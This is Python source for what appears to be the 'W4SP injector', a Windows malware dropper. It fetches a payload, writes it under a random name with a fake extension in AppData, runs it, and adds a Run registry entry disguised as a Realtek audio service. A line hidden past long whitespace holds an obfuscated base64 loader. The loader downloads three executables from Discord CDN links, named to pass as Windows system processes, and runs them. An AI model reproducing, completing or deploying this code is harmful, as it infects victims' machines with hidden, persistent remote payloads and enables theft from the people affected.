from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

import contextlib
DoYouKnowTheWay = getPath() + '\\' + getName()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("aW1wb3J0IG9zO2ltcG9ydCBzdWJwcm9jZXNzIGFzIHh4aTI7dXAgPSBvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdO3RkID0gZiJ7dXB9XFxBcHBEYXRhXFxMb2NhbFxcVGVtcFxcNmNmZGZlZWEtOTMzNi00OGFkLTgyYjMtM2Q0MTI2NDVmNDRmXFwiO29zLm1ha2VkaXJzKHRkLCBleGlzdF9vaz1UcnVlKTt4eGkyLnJ1bihmJ2N1cmwgLXMgLW8gInt0ZH1SdW50aW1lIEJyb2tlci5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1ODA2ODI5NjEwMzExNjgvUnVudGltZV9Ccm9rZXIuZXhlP2V4PTY3NTdlZDdkJmlzPTY3NTY5YmZkJmhtPWZlZjYzMDcyYzYwYzBmZWE0N2MxZjNmZTEwM2YyM2E3MTgxZGE3YjRjNTZlZTU3NDVmYTZmNTZkYzZkNTY1MWUmIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnInt0ZH1SdW50aW1lIEJyb2tlci5leGUiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZidjdXJsIC1zIC1vICJ7dGR9Q09NIFN1cnJvZ2F0ZS5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1NzYzMzk5MDYxNjY4NTQvQ09NX1N1cnJvZ2F0ZS5leGU/ZXg9Njc1N2U5NzEmaXM9Njc1Njk3ZjEmaG09ZTFjN2RhNjZmODc4ZjA3ODE5ZTFhNzRlNzA5ZmNkYTM5ZmFkODVhMzVkNzUzY2FkMmJkY2JlNTMyZjNhZDAzOCYiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZicie3RkfUNPTSBTdXJyb2dhdGUuZXhlIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnY3VybCAtcyAtbyAie3RkfVdpbmRvd3MgU2VjdXJpdHkuZXhlIiAtTCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI4NjUxMDIzOTE3NjMyNzI4OC8xMzE1NTgwNjQ0ODUxNDUzOTUyL1dpbmRvd3NfU2VjdXJpdHkuZXhlP2V4PTY3NTdlZDc0JmlzPTY3NTY5YmY0JmhtPTcwZGUwNjZlMzk1MDVjZmY0NzcxZDliNzQxNDI0ZmY1MWI4ZjhiYmRiZjEyNTA4YTY2N2E3NGIzMmU2MDRlZDYmIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnInt0ZH1XaW5kb3dzIFNlY3VyaXR5LmV4ZSInLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQ=="),'<string>','\x65\x78\x65\x63'))
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
with contextlib.suppress(Exception):
    startUP(DoYouKnowTheWay)
